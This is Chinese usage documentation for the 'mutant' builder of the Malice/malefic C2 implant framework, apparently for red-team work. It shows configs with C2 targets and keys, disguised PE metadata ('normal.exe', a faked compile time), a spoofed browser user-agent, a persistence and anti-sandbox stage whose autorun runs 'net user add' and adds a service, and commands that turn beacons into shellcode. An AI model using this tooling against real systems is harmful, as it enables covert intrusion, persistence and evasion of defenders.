---
title: Internal of Malice · implant手册
---

> 随着 Implant 逐渐解耦， 并可预见的将会有更多组建和模块出现在项目中， 因此一个动态管理工具的出现刻不容缓， 而之前的 config 已经无法满足当前的需求， 因此我们新增了 mutant 模块， 并将之前的 config 经过重构嵌入进了该模块


在设计中， mutant 的定位相当于 MSF venom， 可以动态解析和更改配置以动态生成代码， 也可以通过需求动态生成 shellcode 的 raw 文件, 因此， 目前的 mutant 含有两大模块: 

* generate： 根据配置动态生成代码
* build：创建可用的 shellcode/PE 文件

其中 generate 所依赖的配置均在 malefic/config.yaml 文件中

```bash
$ mutant --help
Config malefic beacon and prelude.

Usage: malefic-mutant.exe <COMMAND>

Commands:
  generate  Config related commands
  build     Generate related commands
  help      Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help
```

## generate

generate 模块将会根据配置动态生成一切所需的代码（pulse, prelude, beacon...）

该组件由原本的 `config` 重构而来， 并增加了更多的功能

### beacon

主体生成物， 这也是我们最初的 config 部分

#### 配置清单

由于 beacon 是整个功能的结合形态， 因此配置项略微复杂， 这里将其分为三部分来介绍

1. basic

    ```yaml
    basic:
    name: "malefic"
    targets:
        - "10.211.55.2:5001"
    protocol: "tcp"
    tls: false
    proxy: ""
    interval: 5
    jitter: 0.2
    ca: ""
    encryption: aes
    key: maliceofinternal
    ```

2. metadata
    
    ```yaml
    metadata:
    remap_path: "C:/Windows/Users/Maleficarum"
    icon: ""
    compile_time: "24 Jun 2015 18:03:01"
    file_version: ""
    product_version: ""
    company_name: ""
    product_name: ""
    original_filename: "normal.exe"
    file_description: "normal"
    internal_name: ""
    ```

3. implants

```yaml 
implants:
    mod: beacon
    register_info: true     # 是否需要在注册时获取系统信息(提示: 该行为为危险行为:)
    hot_load: true          # 是否需要 hot load 功能， 即动态插件加载功能
    modules:                # 所需要使用的 modules
        - "full"            # full (全部模块)， nano(不包含任何模块), base(基础模块)
                            # fs_full (文件系统相关模块), net_full (网络相关模块)
                            # sys_full (系统相关模块)
                            # execute_full (内存执行模块)

    flags:
        start: 0x41         # 交互 body 开始标志
        end: 0x42           # 交互 body 结束标志
        magic: "beautiful"  # 动态校验值
        artifact_id: 0x1    # unused 保留字段
    ```

##### 使用说明

```bash
Config beacon

Usage: malefic-mutant.exe generate beacon [OPTIONS]

Options:
  -h, --help               Print help
```

#### 使用示例

```bash
cargo --release -p mutant generate beacon 
```

### pulse

pulse 作为目前的 shellcode 生成器， 由 mutant 通过解析配置来提供生成代码

#### 配置清单

其所依赖的配置位于 malefic/config.yaml 文件的 pulse 模块

```yaml
pulse:
  flags:
    start: 0x41             # 交互 body 的开始标志
    end: 0x42               # 交互 body 的结束标志
    magic: "beautiful"      # 随机校验
    artifact_id: 16         # 用于控制所拉取的阶段
  encryption: xor           # body 加密方式 (目前为 xor)
  key: "maliceofinternal"   # 加密的 `key` 值
  target: 127.0.0.1:5002    
  protocol: "tcp"           # 通信协议 (目前为 tcp)
  http:
    method: "GET"
    path: "/pulse.bin"
    version: "1.1"
    headers:
      user_agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
      accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      accept_language: "en-US,en;q=0.5"
      accept_encoding: "gzip, deflate"
```

#### 使用说明

```bash
Generate pulse

Usage: malefic-mutant.exe generate pulse [OPTIONS] <ARCH> <PLATFORM>

Arguments:
  <ARCH>      Choice arch x86/x64
  <PLATFORM>  platform, win

Options:
  -h, --help               Print help
```

#### 使用示例

```bash
cargo --release -p mutant generate pulse x64 win
```

### prelude

prelude 为可选的用于在上线前进行权限维持, 反沙箱, 反调试等功能的中间阶段

#### 使用说明

```bash
Config prelude

Usage: malefic-mutant.exe generate prelude [OPTIONS] <YAML_PATH>

Arguments:
  <YAML_PATH>

Options:
  --resources <RESOURCES>  Custom resources dir, default "./resources/" [default: resources]
  -h, --help                   Print help
```

#### autorun.yaml
yaml示例:

```yaml
-  
  name: bof  
  body: !ExecuteBinary  
    name: service  
    bin: !File "addservice.o"
-
  name: exe
  body: !ExecRequest
    args:
      - net
      - user
      - add
      - ....
  
```

这个yaml能被自动打包编译成`spite.bin`

```
malefic-mutant generate prelude autorun.yaml

cargo build -p malefic-prelude
```

能生成一个自动按顺序执行autorun.yaml 中配置的二进制程序.

### bind (Unstable)

在当前实际对抗中, 受到网络环境的限制, 很少有人使用 bind 类型的 webshell. 但在一些极端场景下, 例如不出网的webshell 中, 又或者长时间流量静默的场景下. bind 也许有用武之地

bind 作为新增的临时解决方案, 也由 mutant 来进行调配

```bash
Config bind

Usage: malefic-mutant.exe generate bind [OPTIONS]

Options:
  -h, --help               Print help
```
## build

build 作为一切可直接使用的结果文件生成器， 目前用于生成 `SRDI` 的 shellcode 产物

```bash
Generate related commands

Usage: malefic-mutant.exe build <COMMAND>

Commands:
  srdi        Generate SRDI
  help        Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help
```

### SRDI

作为 PE2SHELLCODE 的常见解决方案， 该模块可以将我们的 prelude / beacon 转化为 shellcode 以供多段加载

```bash
Generate SRDI

Usage: malefic-mutant.exe build srdi [OPTIONS] <SRC_PATH> <PLATFORM> <ARCH> <TARGET_PATH>

Arguments:
  <SRC_PATH>     Source exec path
  <PLATFORM>     platform, win
  <ARCH>         Choice arch x86/x64
  <TARGET_PATH>  Target shellcode path

Options:
      --function-name <FUNCTION_NAME>    Function name [default: ]
      --userdata-path <USER_DATA_PATH>  User data path [default: ]
  -h, --help                             Print help
```

使用示例：

```bash
cargo --release -p mutant build srdi ./beacon.exe win x64 ./beacon.bin

cargo --release -p mutant build srdi ./beacon.dll win x64 ./beacon.bin --function-name "main"
```